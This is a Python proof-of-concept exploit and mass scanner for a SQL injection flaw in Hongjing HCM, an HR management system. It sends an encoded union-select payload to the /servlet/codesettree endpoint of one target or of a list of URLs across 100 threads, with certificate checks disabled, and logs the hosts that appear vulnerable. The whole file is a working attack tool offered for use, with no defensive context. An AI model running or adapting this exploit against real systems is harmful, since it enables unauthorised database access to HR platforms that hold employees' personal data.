import argparse
from multiprocessing.dummy import Pool
import requests

requests.packages.urllib3.disable_warnings()
import sys


def main():
    banner()
    paserse = argparse.ArgumentParser(description="宏景HCM SQL注入漏洞")
    paserse.add_argument('-u', '--url', help="please input your url")
    paserse.add_argument('-f', '--file', help="please input your file")
    args = paserse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as fp:
            fo = fp.readlines()
            url_list = []
            for i in fo:
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def banner():
    banner = """


 /$$                                                     /$$
| $$                                                    | $$
| $$$$$$$   /$$$$$$$  /$$$$$$         /$$$$$$$  /$$$$$$ | $$
| $$__  $$ /$$_____/ /$$__  $$       /$$_____/ /$$__  $$| $$
| $$  \ $$| $$      | $$  \__/      |  $$$$$$ | $$  \ $$| $$
| $$  | $$| $$      | $$             \____  $$| $$  | $$| $$
| $$  | $$|  $$$$$$$| $$             /$$$$$$$/|  $$$$$$$| $$
|__/  |__/ \_______/|__/            |_______/  \____  $$|__/
                                                    | $$    
                                                    | $$    
                                                    |__/    


    """
    print(banner)


def poc(target):
    url = target + '/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hellohongjingHcm~27~2c~40~40version~2d~2d'
    try:
        result = requests.get(url=url, timeout=5, verify=False).text
        if 'SQL' in result:
            with open('resultcrm.txt', 'a') as fp1:
                fp1.write(f'[+]{target} is veriable' + '\n')
        else:
            print(f'[-]{target} is not veriable')
    except:
        print(f'[*]{target} server error')


if __name__ == '__main__':
    main()